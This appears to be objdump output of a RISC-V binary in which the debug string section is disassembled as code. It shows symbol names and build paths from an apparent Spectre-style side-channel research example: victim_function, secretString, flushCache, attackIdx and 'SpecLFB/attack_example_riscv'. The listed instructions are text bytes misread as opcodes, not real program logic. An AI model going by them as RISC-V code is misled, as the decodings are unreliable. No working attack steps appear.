  70:	6e676973          	csrrsi	s2,0x6e6,14
  74:	6465                	lui	s0,0x19
  76:	6920                	ld	s0,80(a0)
  78:	746e                	ld	s0,248(sp)
  7a:	5f00                	lw	s0,56(a4)
  7c:	626c                	ld	a1,192(a2)
  7e:	7366                	ld	t1,120(sp)
  80:	7a69                	lui	s4,0xffffa
  82:	0065                	c.nop	25
  84:	6461                	lui	s0,0x18
  86:	7264                	ld	s1,224(a2)
  88:	6400                	ld	s0,8(s0)
  8a:	6669                	lui	a2,0x1a
  8c:	0066                	c.slli	zero,0x19
  8e:	5f5f 6f6c 6163      	0x61636f6c5f5f
  94:	656c                	ld	a1,200(a0)
  96:	745f 6800 7469      	0x74696800745f
  9c:	7241                	lui	tp,0xffff0
  9e:	6172                	ld	sp,280(sp)
  a0:	0079                	c.nop	30
  a2:	6d5f 7262 6f74      	0x6f7472626d5f
  a8:	735f6377          	0x735f6377
  ac:	6174                	ld	a3,192(a0)
  ae:	6574                	ld	a3,200(a0)
  b0:	5f00                	lw	s0,56(a4)
  b2:	6f746377          	0x6f746377
  b6:	626d                	lui	tp,0x1b
  b8:	735f 6174 6574      	0x65746174735f
  be:	5f00                	lw	s0,56(a4)
  c0:	745f 5f6d 6573      	0x65735f6d745f
  c6:	61770063          	beq	a4,s7,6c6 <_tbss_end+0x642>
  ca:	4f79                	li	t5,30
  cc:	6666                	ld	a2,88(sp)
  ce:	00746573          	csrrsi	a0,0x7,8
  d2:	6f6c                	ld	a1,216(a4)
  d4:	676e                	ld	a4,216(sp)
  d6:	6c20                	ld	s0,88(s0)
  d8:	20676e6f          	jal	t3,762de <_tbss_end+0x7625a>
  dc:	6e69                	lui	t3,0x1a
  de:	0074                	addi	a3,sp,12
  e0:	755f 7562 0066      	0x667562755f
  e6:	625f 7361 0065      	0x657361625f
  ec:	7564                	ld	s1,232(a0)
  ee:	6d6d                	lui	s10,0x1b
  f0:	0079                	c.nop	30
  f2:	5f5f 6d74 685f      	0x685f6d745f5f
  f8:	0072756f          	jal	a0,278fe <_tbss_end+0x2787a>
  fc:	5f5f 6673 5f00      	0x5f0066735f5f
 102:	655f6e6f          	jal	t3,f6f56 <_tbss_end+0xf6ed2>
 106:	6978                	ld	a4,208(a0)
 108:	5f74                	lw	a3,124(a4)
 10a:	7261                	lui	tp,0xffff8
 10c:	61007367          	0x61007367
 110:	7474                	ld	a3,232(s0)
 112:	6361                	lui	t1,0x18
 114:	7864496b          	0x7864496b
 118:	5f00                	lw	s0,56(a4)
 11a:	6b6f6f63          	bltu	t5,s6,7d8 <_tbss_end+0x754>
 11e:	6569                	lui	a0,0x1a
 120:	5f00                	lw	s0,56(a4)
 122:	735f 6c67 6575      	0x65756c67735f
 128:	7400                	ld	s0,40(s0)
 12a:	6d65                	lui	s10,0x19
 12c:	0070                	addi	a2,sp,12
 12e:	665f 616c 7367      	0x7367616c665f
 134:	5f00                	lw	s0,56(a4)
 136:	7369                	lui	t1,0xffffa
 138:	635f 6178 5f00      	0x5f006178635f
 13e:	69647473          	csrrci	s0,0x696,8
 142:	006e                	c.slli	zero,0x1b
 144:	6976                	ld	s2,344(sp)
 146:	6d697463          	bleu	s6,s2,80e <_tbss_end+0x78a>
 14a:	665f 6e75 7463      	0x74636e75665f
 150:	6f69                	lui	t5,0x1a
 152:	006e                	c.slli	zero,0x1b
 154:	5674756f          	jal	a0,47eba <_tbss_end+0x47e36>
 158:	6c61                	lui	s8,0x18
 15a:	7241                	lui	tp,0xffff0
 15c:	6172                	ld	sp,280(sp)
 15e:	0079                	c.nop	30
 160:	625f 6b6c 6973      	0x69736b6c625f
 166:	657a                	ld	a0,408(sp)
 168:	5f00                	lw	s0,56(a4)
 16a:	62747663          	bleu	t2,s0,796 <_tbss_end+0x712>
 16e:	6675                	lui	a2,0x1d
 170:	5f00                	lw	s0,56(a4)
 172:	7366666f          	jal	a2,668a8 <_tbss_end+0x66824>
 176:	7465                	lui	s0,0xffff9
 178:	5f00                	lw	s0,56(a4)
 17a:	626d                	lui	tp,0x1b
 17c:	6f747273          	csrrci	tp,0x6f7,8
 180:	5f736377          	0x5f736377
 184:	74617473          	csrrci	s0,0x746,2
 188:	0065                	c.nop	25
 18a:	6d5f 7262 656c      	0x656c72626d5f
 190:	5f6e                	lw	t5,248(sp)
 192:	74617473          	csrrci	s0,0x746,2
 196:	0065                	c.nop	25
 198:	665f 616e 6772      	0x6772616e665f
 19e:	665f0073          	0x665f0073
 1a2:	736e                	ld	t1,248(sp)
 1a4:	5f00                	lw	s0,56(a4)
 1a6:	6e676973          	csrrsi	s2,0x6e6,14
 1aa:	5f00                	lw	s0,56(a4)
 1ac:	745f 706d 5f00      	0x5f00706d745f
 1b2:	6c66                	ld	s8,88(sp)
 1b4:	5f6b636f          	jal	t1,b67aa <_tbss_end+0xb6726>
 1b8:	0074                	addi	a3,sp,12
 1ba:	735f 6474 7265      	0x72656474735f
 1c0:	0072                	c.slli	zero,0x1c
 1c2:	425f 6769 6e69      	0x6e696769425f
 1c8:	0074                	addi	a3,sp,12
 1ca:	675f 6d61 616d      	0x616d6d61675f
 1d0:	735f 6769 676e      	0x676e6769735f
 1d6:	6d61                	lui	s10,0x18
 1d8:	5f00                	lw	s0,56(a4)
 1da:	6572                	ld	a0,280(sp)
 1dc:	6461                	lui	s0,0x18
 1de:	5f00                	lw	s0,56(a4)
 1e0:	6572                	ld	a0,280(sp)
 1e2:	746c7573          	csrrci	a0,0x746,24
 1e6:	6b5f 5f00 745f      	0x745f5f006b5f
 1ec:	006d                	c.nop	27
 1ee:	6e69                	lui	t3,0x1a
 1f0:	7241                	lui	tp,0xffff0
 1f2:	6172                	ld	sp,280(sp)
 1f4:	5379                	li	t1,-2
 1f6:	7a69                	lui	s4,0xffffa
 1f8:	0065                	c.nop	25
 1fa:	5f5f 6377 6268      	0x626863775f5f
 200:	5f00                	lw	s0,56(a4)
 202:	6f647473          	csrrci	s0,0x6f6,8
 206:	7475                	lui	s0,0xffffd
 208:	5f00                	lw	s0,56(a4)
 20a:	6c747663          	bleu	t2,s0,8d6 <_tbss_end+0x852>
 20e:	6e65                	lui	t3,0x19
 210:	6900                	ld	s0,16(a0)
 212:	416e                	lw	sp,216(sp)
 214:	7272                	ld	tp,312(sp)
 216:	7961                	lui	s2,0xffff8
 218:	5f00                	lw	s0,56(a4)
 21a:	6966                	ld	s2,88(sp)
 21c:	656c                	ld	a1,200(a0)
 21e:	5f00                	lw	s0,56(a4)
 220:	696e                	ld	s2,216(sp)
 222:	0073626f          	jal	tp,36a28 <_tbss_end+0x369a4>
 226:	726f6873          	csrrsi	a6,0x726,30
 22a:	2074                	fld	fa3,192(s0)
 22c:	6e75                	lui	t3,0x1d
 22e:	6e676973          	csrrsi	s2,0x6e6,14
 232:	6465                	lui	s0,0x19
 234:	6920                	ld	s0,80(a0)
 236:	746e                	ld	s0,248(sp)
 238:	5f00                	lw	s0,56(a4)
 23a:	7461                	lui	s0,0xffff8
 23c:	7865                	lui	a6,0xffff9
 23e:	7469                	lui	s0,0xffffa
 240:	0030                	addi	a2,sp,8
 242:	6c66                	ld	s8,88(sp)
 244:	7375                	lui	t1,0xffffd
 246:	4368                	lw	a0,68(a4)
 248:	6361                	lui	t1,0x18
 24a:	6568                	ld	a0,200(a0)
 24c:	5f00                	lw	s0,56(a4)
 24e:	6e676973          	csrrsi	s2,0x6e6,14
 252:	6c61                	lui	s8,0x18
 254:	625f 6675 5f00      	0x5f006675625f
 25a:	7361                	lui	t1,0xffff8
 25c:	6d697463          	bleu	s6,s2,924 <_tbss_end+0x8a0>
 260:	5f65                	li	t5,-7
 262:	7562                	ld	a0,56(sp)
 264:	0066                	c.slli	zero,0x19
 266:	725f 7365 6c75      	0x6c757365725f
 26c:	0074                	addi	a3,sp,12
 26e:	5f5f 6377 0068      	0x6863775f5f
 274:	746e6977          	0x746e6977
 278:	745f 5f00 6f6c      	0x6f6c5f00745f
 27e:	5f006b63          	bltu	zero,a6,874 <_tbss_end+0x7f0>
 282:	6c66                	ld	s8,88(sp)
 284:	6761                	lui	a4,0x18
 286:	73003273          	csrrc	tp,0x730,zero
 28a:	6372                	ld	t1,280(sp)
 28c:	6570732f          	0x6570732f
 290:	65727463          	bleu	s7,tp,8d8 <_tbss_end+0x854>
 294:	762d                	lui	a2,0xfffeb
 296:	2e34                	fld	fa3,88(a2)
 298:	775f0063          	beq	t5,s5,9f8 <_tbss_end+0x974>
 29c:	6972                	ld	s2,280(sp)
 29e:	6574                	ld	a3,200(a0)
 2a0:	4700                	lw	s0,8(a4)
 2a2:	554e                	lw	a0,240(sp)
 2a4:	4320                	lw	s0,64(a4)
 2a6:	3131                	addiw	sp,sp,-20
 2a8:	3720                	fld	fs0,104(a4)
 2aa:	322e                	fld	ft4,232(sp)
 2ac:	302e                	fld	ft0,232(sp)
 2ae:	2d20                	fld	fs0,88(a0)
 2b0:	636d                	lui	t1,0x1b
 2b2:	6f6d                	lui	t5,0x1b
 2b4:	6564                	ld	s1,200(a0)
 2b6:	3d6c                	fld	fa1,248(a0)
 2b8:	656d                	lui	a0,0x1b
 2ba:	6164                	ld	s1,192(a0)
 2bc:	796e                	ld	s2,248(sp)
 2be:	2d20                	fld	fs0,88(a0)
 2c0:	616d                	addi	sp,sp,240
 2c2:	6372                	ld	t1,280(sp)
 2c4:	3d68                	fld	fa0,248(a0)
 2c6:	7672                	ld	a2,312(sp)
 2c8:	3436                	fld	fs0,360(sp)
 2ca:	6d69                	lui	s10,0x1a
 2cc:	6661                	lui	a2,0x18
 2ce:	6364                	ld	s1,192(a4)
 2d0:	2d20                	fld	fs0,88(a0)
 2d2:	616d                	addi	sp,sp,240
 2d4:	6962                	ld	s2,24(sp)
 2d6:	6c3d                	lui	s8,0xf
 2d8:	3670                	fld	fa2,232(a2)
 2da:	6434                	ld	a3,72(s0)
 2dc:	2d20                	fld	fs0,88(a0)
 2de:	4f2d2067          	0x4f2d2067
 2e2:	2030                	fld	fa2,64(s0)
 2e4:	662d                	lui	a2,0xb
 2e6:	6f6e                	ld	t5,216(sp)
 2e8:	632d                	lui	t1,0xb
 2ea:	6f6d6d6f          	jal	s10,d69e0 <_tbss_end+0xd695c>
 2ee:	206e                	fld	ft0,216(sp)
 2f0:	662d                	lui	a2,0xb
 2f2:	6f6e                	ld	t5,216(sp)
 2f4:	622d                	lui	tp,0xb
 2f6:	6975                	lui	s2,0x1d
 2f8:	746c                	ld	a1,232(s0)
 2fa:	6e69                	lui	t3,0x1a
 2fc:	702d                	c.lui	zero,0xfffeb
 2fe:	6972                	ld	s2,280(sp)
 300:	746e                	ld	s0,248(sp)
 302:	0066                	c.slli	zero,0x19
 304:	6e75                	lui	t3,0x1d
 306:	7375                	lui	t1,0xffffd
 308:	6465                	lui	s0,0x19
 30a:	0032                	c.slli	zero,0xc
 30c:	7074756f          	jal	a0,48212 <_tbss_end+0x4818e>
 310:	7475                	lui	s0,0xffffd
 312:	5f00                	lw	s0,56(a4)
 314:	6d6e                	ld	s10,216(sp)
 316:	6c61                	lui	s8,0x18
 318:	6f6c                	ld	a1,216(a4)
 31a:	6f740063          	beq	s0,s7,9fa <_tbss_end+0x976>
 31e:	5470                	lw	a2,108(s0)
 320:	64496f77          	0x64496f77
 324:	0078                	addi	a4,sp,12
 326:	6f6c                	ld	a1,216(a4)
 328:	676e                	ld	a4,216(sp)
 32a:	6420                	ld	s0,72(s0)
 32c:	6c62756f          	jal	a0,279f2 <_tbss_end+0x2796e>
 330:	0065                	c.nop	25
 332:	6e5f 7865 6674      	0x667478656e5f
 338:	7300                	ld	s0,32(a4)
 33a:	6365                	lui	t1,0x19
 33c:	6572                	ld	a0,280(sp)
 33e:	5374                	lw	a3,100(a4)
 340:	7274                	ld	a3,224(a2)
 342:	6e69                	lui	t3,0x1a
 344:	5f5f0067          	jr	1525(t5) # 1b5f5 <_tbss_end+0x1b571>
 348:	6d74                	ld	a3,216(a0)
 34a:	6d5f 6e6f 5f00      	0x5f006e6f6d5f
 350:	7461                	lui	s0,0xffff8
 352:	7865                	lui	a6,0xffff9
 354:	7469                	lui	s0,0xffffa
 356:	5f00                	lw	s0,56(a4)
 358:	735f 6964 6964      	0x69646964735f
 35e:	696e                	ld	s2,216(sp)
 360:	0074                	addi	a3,sp,12
 362:	6f5f 6666 745f      	0x745f66666f5f
 368:	6100                	ld	s0,0(a0)
 36a:	7272                	ld	tp,312(sp)
 36c:	7961                	lui	s2,0xffff8
 36e:	0031                	c.nop	12
 370:	7261                	lui	tp,0xffff8
 372:	6172                	ld	sp,280(sp)
 374:	3279                	addiw	tp,tp,-2
 376:	5f00                	lw	s0,56(a4)
 378:	755f 6e69 3674      	0x36746e69755f
 37e:	5f34                	lw	a3,120(a4)
 380:	0074                	addi	a3,sp,12
 382:	6975                	lui	s2,0x1d
 384:	6554                	ld	a3,136(a0)
 386:	706d                	c.lui	zero,0xffffb
 388:	5f00                	lw	s0,56(a4)
 38a:	7266                	ld	tp,120(sp)
 38c:	6565                	lui	a0,0x19
 38e:	696c                	ld	a1,208(a0)
 390:	5f007473          	csrrci	s0,0x5f0,0
 394:	4f4c                	lw	a1,28(a4)
 396:	525f4b43          	fmadd.d	fs6,ft10,ft5,fa0,rmm
 39a:	4345                	li	t1,17
 39c:	5255                	li	tp,-11
 39e:	45564953          	0x45564953
 3a2:	545f 6e00 6d75      	0x6d756e00545f
 3a8:	73746553          	0x73746553
 3ac:	61656c43          	fmadd.s	fs8,fa0,fs6,fa2,unknown
 3b0:	0072                	c.slli	zero,0x1c
 3b2:	6e75                	lui	t3,0x1d
 3b4:	6e676973          	csrrsi	s2,0x6e6,14
 3b8:	6465                	lui	s0,0x19
 3ba:	6320                	ld	s0,64(a4)
 3bc:	6168                	ld	a0,192(a0)
 3be:	0072                	c.slli	zero,0x1c
 3c0:	7564                	ld	s1,232(a0)
 3c2:	6d6d                	lui	s10,0x1b
 3c4:	4d79                	li	s10,30
 3c6:	6d65                	lui	s10,0x19
 3c8:	5f00                	lw	s0,56(a4)
 3ca:	656e                	ld	a0,216(sp)
 3cc:	685f0077          	0x685f0077
 3d0:	655f 7272 6f6e      	0x6f6e7272655f
 3d6:	7300                	ld	s0,32(a4)
 3d8:	6f68                	ld	a0,216(a4)
 3da:	7472                	ld	s0,312(sp)
 3dc:	6920                	ld	s0,80(a0)
 3de:	746e                	ld	s0,248(sp)
 3e0:	5f00                	lw	s0,56(a4)
 3e2:	745f 5f6d 6479      	0x64795f6d745f
 3e8:	7961                	lui	s2,0xffff8
 3ea:	5f00                	lw	s0,56(a4)
 3ec:	735f 7562 0066      	0x667562735f
 3f2:	695f 626f 0073      	0x73626f695f
 3f8:	5f5f 4946 454c      	0x454c49465f5f
 3fe:	5f00                	lw	s0,56(a4)
 400:	626d                	lui	tp,0x1b
 402:	74617473          	csrrci	s0,0x746,2
 406:	5f65                	li	t5,-7
 408:	0074                	addi	a3,sp,12
 40a:	5f5f 4673 4c49      	0x4c4946735f5f
 410:	0045                	c.nop	17
 412:	6d5f 7362 6174      	0x617473626d5f
 418:	6574                	ld	a3,200(a0)
 41a:	5f00                	lw	s0,56(a4)
 41c:	6172                	ld	sp,280(sp)
 41e:	646e                	ld	s0,216(sp)
 420:	6e5f 7865 0074      	0x7478656e5f
 426:	6d5f 6c62 6e65      	0x6e656c626d5f
 42c:	735f 6174 6574      	0x65746174735f
 432:	5f00                	lw	s0,56(a4)
 434:	6e69                	lui	t3,0x1a
 436:	695f0063          	beq	t5,s5,ab6 <_tbss_end+0xa32>
 43a:	646e                	ld	s0,216(sp)
 43c:	5f00                	lw	s0,56(a4)
 43e:	6f6c                	ld	a1,216(a4)
 440:	656c6163          	bltu	s8,s6,a82 <_tbss_end+0x9fe>
 444:	5f00                	lw	s0,56(a4)
 446:	635f 656c 6e61      	0x6e61656c635f
 44c:	7075                	c.lui	zero,0xffffd
 44e:	5f00                	lw	s0,56(a4)
 450:	6e75                	lui	t3,0x1d
 452:	63657073          	csrci	0x636,10
 456:	6669                	lui	a2,0x1a
 458:	6569                	lui	a0,0x1a
 45a:	5f64                	lw	s1,124(a4)
 45c:	6f6c                	ld	a1,216(a4)
 45e:	656c6163          	bltu	s8,s6,aa0 <_tbss_end+0xa1c>
 462:	695f 666e 006f      	0x6f666e695f
 468:	6d5f 7861 6477      	0x647778616d5f
 46e:	725f0073          	0x725f0073
 472:	6565                	lui	a0,0x19
 474:	746e                	ld	s0,248(sp)
 476:	5f00                	lw	s0,56(a4)
 478:	64656573          	csrrsi	a0,0x646,10
 47c:	5f00                	lw	s0,56(a4)
 47e:	635f 756f 746e      	0x746e756f635f
 484:	5f00                	lw	s0,56(a4)
 486:	765f 6c61 6575      	0x65756c61765f
 48c:	5f00                	lw	s0,56(a4)
 48e:	6b656573          	csrrsi	a0,0x6b6,10
 492:	2f00                	fld	fs0,24(a4)
 494:	6f68                	ld	a0,216(a4)
 496:	656d                	lui	a0,0x1b
 498:	6568632f          	0x6568632f
 49c:	676e                	ld	a4,216(sp)
 49e:	6978                	ld	a4,208(a0)
 4a0:	6f61                	lui	t5,0x18
 4a2:	7579                	lui	a0,0xffffe
 4a4:	6570532f          	0x6570532f
 4a8:	42464c63          	blt	a2,tp,8e0 <_tbss_end+0x85c>
 4ac:	7474612f          	0x7474612f
 4b0:	6361                	lui	t1,0x18
 4b2:	78655f6b          	0x78655f6b
 4b6:	6d65                	lui	s10,0x19
 4b8:	6c70                	ld	a2,216(s0)
 4ba:	5f65                	li	t5,-7
 4bc:	6972                	ld	s2,280(sp)
 4be:	00766373          	csrrsi	t1,0x7,12
 4c2:	665f 6f70 5f73      	0x5f736f70665f
 4c8:	0074                	addi	a3,sp,12
 4ca:	5f5f 6d74 795f      	0x795f6d745f5f
 4d0:	6165                	addi	sp,sp,112
 4d2:	0072                	c.slli	zero,0x1c
 4d4:	5f5f 6d74 6d5f      	0x6d5f6d745f5f
 4da:	6e69                	lui	t3,0x1a
 4dc:	6300                	ld	s0,0(a4)
 4de:	6449                	lui	s0,0x12
 4e0:	0078                	addi	a4,sp,12
 4e2:	4974756f          	jal	a0,48178 <_tbss_end+0x480f4>
 4e6:	7864                	ld	s1,240(s0)
 4e8:	7241                	lui	tp,0xffff0
 4ea:	6172                	ld	sp,280(sp)
 4ec:	0079                	c.nop	30
 4ee:	6d5f 6c75 0074      	0x746c756d5f
 4f4:	735f 7274 6f74      	0x6f747274735f
 4fa:	616c5f6b          	0x616c5f6b
 4fe:	5f007473          	csrrci	s0,0x5f0,0
 502:	6e66                	ld	t3,88(sp)
 504:	7974                	ld	a3,240(a0)
 506:	6570                	ld	a2,200(a0)
 508:	615f0073          	0x615f0073
 50c:	6464                	ld	s1,200(s0)
 50e:	5f00                	lw	s0,56(a4)
 510:	555f 6f4c 676e      	0x676e6f4c555f
 516:	5f00                	lw	s0,56(a4)
 518:	64746567          	0x64746567
 51c:	7461                	lui	s0,0xffff8
 51e:	5f65                	li	t5,-7
 520:	7265                	lui	tp,0xffff9
 522:	0072                	c.slli	zero,0x1c
 524:	675f 6f6c 6162      	0x61626f6c675f
 52a:	5f6c                	lw	a1,124(a4)
 52c:	6d69                	lui	s10,0x1a
 52e:	7570                	ld	a2,232(a0)
 530:	6572                	ld	a0,280(sp)
 532:	705f 7274 6100      	0x61007274705f
 538:	696c                	ld	a1,208(a0)
 53a:	64656e67          	0x64656e67
 53e:	654d                	lui	a0,0x13
 540:	006d                	c.nop	27
 542:	755f 756e 6573      	0x6573756e755f
 548:	5f64                	lw	s1,124(a4)
 54a:	6172                	ld	sp,280(sp)
 54c:	646e                	ld	s0,216(sp)
 54e:	5f00                	lw	s0,56(a4)
 550:	00736477          	0x736477
 554:	5f5f 6d74 775f      	0x775f6d745f5f
 55a:	6164                	ld	s1,192(a0)
 55c:	0079                	c.nop	30
 55e:	675f 756c 0065      	0x65756c675f
 564:	735f 6973 657a      	0x657a6973735f
 56a:	745f 5f00 366c      	0x366c5f00745f
 570:	6134                	ld	a3,64(a0)
 572:	625f 6675 5f00      	0x5f006675625f
 578:	5f676973          	csrrsi	s2,0x5f6,14
 57c:	7566                	ld	a0,120(sp)
 57e:	636e                	ld	t1,216(sp)
 580:	5f00                	lw	s0,56(a4)
 582:	626e                	ld	tp,216(sp)
 584:	6675                	lui	a2,0x1d
 586:	5f00                	lw	s0,56(a4)
 588:	6e75                	lui	t3,0x1d
 58a:	7375                	lui	t1,0xffffd
 58c:	6465                	lui	s0,0x19
 58e:	5f00                	lw	s0,56(a4)
 590:	745f 5f6d 7369      	0x73695f6d745f
 596:	7364                	ld	s1,224(a4)
 598:	0074                	addi	a3,sp,12
 59a:	6c5f 636f 6c61      	0x6c61636f6c5f
 5a0:	6974                	ld	a3,208(a0)
 5a2:	656d                	lui	a0,0x1b
 5a4:	625f 6675 5f00      	0x5f006675625f
 5aa:	736f6c63          	bltu	t5,s6,ce2 <_tbss_end+0xc5e>
 5ae:	0065                	c.nop	25
 5b0:	725f 3834 7300      	0x73003834725f
 5b6:	6174                	ld	a3,192(a0)
 5b8:	7472                	ld	s0,312(sp)
 5ba:	5f00                	lw	s0,56(a4)
 5bc:	626d                	lui	tp,0x1b
 5be:	6f74                	ld	a3,216(a4)
 5c0:	735f6377          	0x735f6377
 5c4:	6174                	ld	a3,192(a0)
 5c6:	6574                	ld	a3,200(a0)
 5c8:	7200                	ld	s0,32(a2)
 5ca:	7365                	lui	t1,0xffff9
 5cc:	6c75                	lui	s8,0x1d
 5ce:	7374                	ld	a3,224(a4)
 5d0:	5f00                	lw	s0,56(a4)
 5d2:	3570                	fld	fa2,232(a0)
 5d4:	72610073          	0x72610073
 5d8:	6172                	ld	sp,280(sp)
 5da:	3179                	addiw	sp,sp,-2
 5dc:	735f 007a 616d      	0x616d007a735f
 5e2:	6e69                	lui	t3,0x1a
 5e4:	7300                	ld	s0,32(a4)
 5e6:	7274                	ld	a3,224(a2)
 5e8:	695f 646e 7865      	0x7865646e695f
 5ee:	5f00                	lw	s0,56(a4)
 5f0:	745f 5f6d 646d      	0x646d5f6d745f
 5f6:	7961                	lui	s2,0xffff8
 5f8:	7300                	ld	s0,32(a4)
 5fa:	6372                	ld	t1,280(sp)
 5fc:	7472632f          	0x7472632f
 600:	532e                	lw	t1,232(sp)
 602:	2f00                	fld	fs0,24(a4)
 604:	6f68                	ld	a0,216(a4)
 606:	656d                	lui	a0,0x1b
 608:	6568632f          	0x6568632f
 60c:	676e                	ld	a4,216(sp)
 60e:	6978                	ld	a4,208(a0)
 610:	6f61                	lui	t5,0x18
 612:	7579                	lui	a0,0xffffe
 614:	6570532f          	0x6570532f
 618:	42464c63          	blt	a2,tp,a50 <_tbss_end+0x9cc>
 61c:	7474612f          	0x7474612f
 620:	6361                	lui	t1,0x18
 622:	7865206b          	0x7865206b
 626:	6d65                	lui	s10,0x19
 628:	6c70                	ld	a2,216(s0)
 62a:	0065                	c.nop	25
 62c:	20554e47          	fmsub.s	ft8,fa0,ft5,ft4,rmm
 630:	5341                	li	t1,-16
 632:	3220                	fld	fs0,96(a2)
 634:	322e                	fld	ft4,232(sp)
 636:	0039                	c.nop	14
 638:	2f637273          	csrrci	tp,0x2f6,6
 63c:	63617473          	csrrci	s0,0x636,2
 640:	00532e6b          	0x532e6b
 644:	616e                	ld	sp,216(sp)
 646:	656d                	lui	a0,0x1b
 648:	5f00                	lw	s0,56(a4)
 64a:	6c74                	ld	a3,216(s0)
 64c:	61645f73          	csrrwi	t5,0x616,8
 650:	6174                	ld	a3,192(a0)
 652:	7300                	ld	s0,32(a4)
 654:	7274                	ld	a3,224(a2)
 656:	656c                	ld	a1,200(a0)
 658:	006e                	c.slli	zero,0x1b
 65a:	7270                	ld	a2,224(a2)
 65c:	6e69                	lui	t3,0x1a
 65e:	4174                	lw	a3,68(a0)
 660:	7272                	ld	tp,312(sp)
 662:	7961                	lui	s2,0xffff8
 664:	6300                	ld	s0,0(a4)
 666:	7561                	lui	a0,0xffff8
 668:	73006573          	csrrsi	a0,0x730,0
 66c:	7274                	ld	a3,224(a2)
 66e:	6c6e                	ld	s8,216(sp)
 670:	6e65                	lui	t3,0x19
 672:	7000                	ld	s0,32(s0)
 674:	6f72                	ld	t5,280(sp)
 676:	73736563          	bltu	t1,s7,da0 <_tbss_end+0xd1c>
 67a:	705f 6572 6963      	0x69636572705f
 680:	6e6f6973          	csrrsi	s2,0x6e6,30
 684:	7400                	ld	s0,40(s0)
 686:	6164                	ld	s1,192(a0)
 688:	6174                	ld	a3,192(a0)
 68a:	735f 7a69 0065      	0x657a69735f
 690:	745f 6164 6174      	0x61746164745f
 696:	655f 646e 6700      	0x6700646e655f
 69c:	7465                	lui	s0,0xffff9
 69e:	6975                	lui	s2,0x1d
 6a0:	746e                	ld	s0,248(sp)
 6a2:	7000                	ld	s0,32(s0)
 6a4:	7475                	lui	s0,0xffffd
 6a6:	72616863          	bltu	sp,t1,dd6 <_tbss_end+0xd52>
 6aa:	7200                	ld	s0,32(a2)
 6ac:	6765                	lui	a4,0x19
 6ae:	72700073          	0x72700073
 6b2:	6e69                	lui	t3,0x1a
 6b4:	7374                	ld	a3,224(a4)
 6b6:	7274                	ld	a3,224(a2)
 6b8:	6200                	ld	s0,0(a2)
 6ba:	7261                	lui	tp,0xffff8
 6bc:	6972                	ld	s2,280(sp)
 6be:	7265                	lui	tp,0xffff9
 6c0:	6800                	ld	s0,16(s0)
 6c2:	6e61                	lui	t3,0x18
 6c4:	6c64                	ld	s1,216(s0)
 6c6:	5f65                	li	t5,-7
 6c8:	7274                	ld	a3,224(a2)
 6ca:	7061                	c.lui	zero,0xffff8
 6cc:	7400                	ld	s0,40(s0)
 6ce:	7268                	ld	a0,224(a2)
 6d0:	6165                	addi	sp,sp,112
 6d2:	5f64                	lw	s1,124(a4)
 6d4:	6e65                	lui	t3,0x19
 6d6:	7274                	ld	a3,224(a2)
 6d8:	0079                	c.nop	30
 6da:	63727473          	csrrci	s0,0x637,4
 6de:	7970                	ld	a2,240(a0)
 6e0:	7000                	ld	s0,32(s0)
 6e2:	6972                	ld	s2,280(sp)
 6e4:	746e                	ld	s0,248(sp)
 6e6:	756e                	ld	a0,248(sp)
 6e8:	006d                	c.nop	27
 6ea:	6e65                	lui	t3,0x19
 6ec:	6261                	lui	tp,0x18
 6ee:	656c                	ld	a1,200(a0)
 6f0:	6100                	ld	s0,0(a0)
 6f2:	6f62                	ld	t5,24(sp)
 6f4:	7472                	ld	s0,312(sp)
 6f6:	5f00                	lw	s0,56(a4)
 6f8:	675f 756e 5f63      	0x5f63756e675f
 6fe:	6176                	ld	sp,344(sp)
 700:	6c5f 7369 0074      	0x7473696c5f
 706:	6170                	ld	a2,192(a0)
 708:	6364                	ld	s1,192(a4)
 70a:	7300                	ld	s0,32(a4)
 70c:	6372                	ld	t1,280(sp)
 70e:	7379732f          	0x7379732f
 712:	6c6c6163          	bltu	s8,t1,dd4 <_tbss_end+0xd50>
 716:	00632e73          	csrrs	t3,0x6,t1
 71a:	74646977          	0x74646977
 71e:	0068                	addi	a0,sp,12
 720:	30727473          	csrrci	s0,0x307,4
 724:	6300                	ld	s0,0(a4)
 726:	746e756f          	jal	a0,e7e6c <_tbss_end+0xe7de8>
 72a:	7265                	lui	tp,0xffff9
 72c:	6f630073          	0x6f630073
 730:	6564                	ld	s1,200(a0)
 732:	6c00                	ld	s0,24(s0)
 734:	7366                	ld	t1,120(sp)
 736:	0072                	c.slli	zero,0x1c
 738:	6d6f682f          	0x6d6f682f
 73c:	2f65                	addiw	t5,t5,25
 73e:	6e656863          	bltu	a0,t1,e2e <_tbss_end+0xdaa>
 742:	61697867          	0x61697867
 746:	2f75796f          	jal	s2,5823c <_tbss_end+0x581b8>
 74a:	70696863          	bltu	s2,t1,e5a <_tbss_end+0xdd6>
 74e:	6179                	addi	sp,sp,464
 750:	6472                	ld	s0,280(sp)
 752:	6d69732f          	0x6d69732f
 756:	74612f73          	csrrs	t5,0x746,sp
 75a:	6174                	ld	a3,192(a0)
 75c:	00316b63          	bltu	sp,gp,772 <_tbss_end+0x6ee>
 760:	616c                	ld	a1,192(a0)
 762:	665f7473          	csrrci	s0,0x665,30
 766:	746d                	lui	s0,0xffffb
 768:	6200                	ld	s0,0(a2)
 76a:	6675                	lui	a2,0x1d
 76c:	656c                	ld	a1,200(a0)
 76e:	006e                	c.slli	zero,0x1b
 770:	6572                	ld	a0,280(sp)
 772:	74697773          	csrrci	a4,0x746,18
 776:	73006863          	bltu	zero,a6,ea6 <_tbss_end+0xe22>
 77a:	7274                	ld	a3,224(a2)
 77c:	00706d63          	bltu	zero,t2,796 <_tbss_end+0x712>
 780:	7270                	ld	a2,224(a2)
 782:	6e69                	lui	t3,0x1a
 784:	4474                	lw	a3,76(s0)
 786:	6c62756f          	jal	a0,27e4c <_tbss_end+0x27dc8>
 78a:	4165                	li	sp,25
 78c:	7272                	ld	tp,312(sp)
 78e:	7961                	lui	s2,0xffff8
 790:	6c00                	ld	s0,24(s0)
 792:	6c66                	ld	s8,88(sp)
 794:	6761                	lui	a4,0x18
 796:	7000                	ld	s0,32(s0)
 798:	00727473          	csrrci	s0,0x7,4
 79c:	656d                	lui	a0,0x1b
 79e:	736d                	lui	t1,0xffffb
 7a0:	7465                	lui	s0,0xffff9
 7a2:	6100                	ld	s0,0(a0)
 7a4:	6772                	ld	a4,280(sp)
 7a6:	0030                	addi	a2,sp,8
 7a8:	7261                	lui	tp,0xffff8
 7aa:	61003167          	0x61003167
 7ae:	6772                	ld	a4,280(sp)
 7b0:	0032                	c.slli	zero,0xc
 7b2:	695f 696e 0074      	0x74696e695f
 7b8:	63737973          	csrrci	s2,0x637,6
 7bc:	6c61                	lui	s8,0x18
